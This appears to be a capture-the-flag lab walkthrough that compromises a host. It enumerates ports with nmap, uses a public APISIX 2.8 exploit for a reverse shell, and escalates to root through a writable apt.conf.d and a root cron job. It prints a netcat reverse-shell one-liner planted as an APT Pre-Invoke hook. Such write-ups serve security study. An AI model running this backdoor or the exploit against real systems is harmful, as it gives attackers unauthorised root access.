First enumeration with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Tue Jan 10 09:53:56 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.108.220
Nmap scan report for 192.168.108.220
Host is up (0.15s latency).
Not shown: 65405 filtered tcp ports (no-response), 125 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
3306/tcp  open   mysql
43500/tcp open   unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Jan 10 09:56:07 2023 -- 1 IP address (1 host up) scanned in 131.30 seconds
```

now we know what ports are open, let's run default nmap scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 22,80,3306,43500 -Pn <IP>`

```
# Nmap 7.93 scan initiated Tue Jan 10 09:58:01 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80,3306,43500 -Pn 192.168.108.220
Nmap scan report for 192.168.108.220
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62361a5cd3e37be170f8a3b31c4c2438 (RSA)
|   256 ee25fc236605c0c1ec47c6bb00c74f53 (ECDSA)
|_  256 835c51ac32e53a217cf6c2cd936858d8 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql   MySQL (unauthorized)
43500/tcp open  http    OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 10 09:58:20 2023 -- 1 IP address (1 host up) scanned in 19.61 seconds
```

cool we got to know what services are running on those ports. let's start enumeration with port 80 (http).

![image](https://user-images.githubusercontent.com/87468669/211518834-3cc7683e-6328-4925-9f4d-0440430bb26d.png)

We discover a webserver running on port 80. After opening it in a browser, we are directed to a homepage containing pictures and about. after much playing around, got nothing. let move to the next port 43500 (http).

![image](https://user-images.githubusercontent.com/87468669/211518967-9ecc2afd-2c9e-4889-9aa9-2db8fc70884b.png)

after opening the it on a browser, i got an error message `{"error_msg":"404 Route Not Found"}` back to the nmap scan result we can see the header of the web service `APISIX/2.8`. let's look for an exploit.

![image](https://user-images.githubusercontent.com/87468669/211519013-7f958518-fd53-47d5-8a26-f77208fdbd9a.png)

found an exploit on searchsploit `multiple/remote/50829.py` , so what this exploit does it injectes  malicious api keys to the header of the api and spawn a reverse shell for us.

![image](https://user-images.githubusercontent.com/87468669/211519096-92119a48-f644-4a81-9634-7f2a18aafa6b.png)

ran the exploit, fired ncat listener.

![image](https://user-images.githubusercontent.com/87468669/211519165-edcb6d28-dd34-4472-a826-39d3074849ee.png)

Boom we are in as user `franklin` stablized the shell.

## Privilege Escalation

![image](https://user-images.githubusercontent.com/87468669/211537418-c3baf6bc-92c0-4e60-ab54-637e1e53e59b.png)

![image](https://user-images.githubusercontent.com/87468669/211537602-650b1e8e-4571-40c9-aa96-93a4c8e60646.png)

running linpeas, i saw cronjobs running as root, and also the `/etc/apt/apt.conf.d` directory is writable, guess that's our way in. who know but let's find out.😉 

## Exploiting cronjob

Let’s exploit apt-get service by abusing cron job as we all know cron job run as root. Suppose we had access to the targeted system locally and want the root user rights to enhanced limited shell access.
And we know apt.conf.d file has full permission as said above (You can also manually check to ensure the writable directory using find command) in the lab setup. Therefore, we will create a malicious file inside apt.conf.d by injecting netcat reverse backdoor:

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.108 22 >/tmp/f"};' > pwn
```

![image](https://user-images.githubusercontent.com/87468669/211539062-5f79539e-ac88-4525-94f9-4e6f6b440cd5.png)

Start the netcat listener to access the reverse connection of the host machine and wait for 2 minutes to obtain the privilege shell since apt-get update task is scheduled to update the packages every time, after minute through crontab that runs as root and it runs our netcat backdoor pwn to get reverse connections

![image](https://user-images.githubusercontent.com/87468669/211540483-3a99a95e-a6ec-44bc-a5dc-de4951880bb4.png)

and we got root!!!😎
